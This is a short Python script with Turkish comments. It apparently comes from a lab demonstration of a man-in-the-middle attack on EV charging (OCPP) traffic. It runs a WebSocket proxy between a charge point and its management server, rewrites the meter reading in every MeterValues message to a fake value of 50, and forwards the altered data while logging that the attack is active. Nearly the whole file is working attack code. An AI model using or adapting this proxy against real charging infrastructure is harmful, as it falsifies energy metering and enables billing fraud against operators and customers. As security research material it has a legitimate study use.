import asyncio
import websockets
import json

CSMS_URI = "ws://localhost:9000"

# websockets 15.x → sadece 1 parametre alınır
async def proxy_handler(websocket):
    print("[MITM] CP bağlandı → Saldırı aktif.")

    # CSMS'e bağlan
    async with websockets.connect(CSMS_URI) as csms:
        async for message in websocket:

            data = json.loads(message)

            # Yalnızca MeterValues mesajını manipüle ediyoruz
            if data.get("action") == "MeterValues":
                try:
                    original_value = data["payload"]["meterValue"][0]["sampledValue"][0]["value"]

                    fake_value = 50  # sahte değer
                    data["payload"]["meterValue"][0]["sampledValue"][0]["value"] = str(fake_value)

                    print(f"[MITM] ORIJINAL: {original_value} → SAHTE: {fake_value}")

                except Exception as e:
                    print("[MITM] Manipülasyon hatası:", e)

            # Manipüle edilen (veya edilmeyen) mesaj CSMS'e yönlendirilir
            await csms.send(json.dumps(data))

async def main():
    print("[MITM] Proxy başlatıldı → ws://localhost:8000")
    # websockets.serve → handler sadece 1 parametre alır
    async with websockets.serve(proxy_handler, "localhost", 8000):
        await asyncio.Future()

asyncio.run(main())

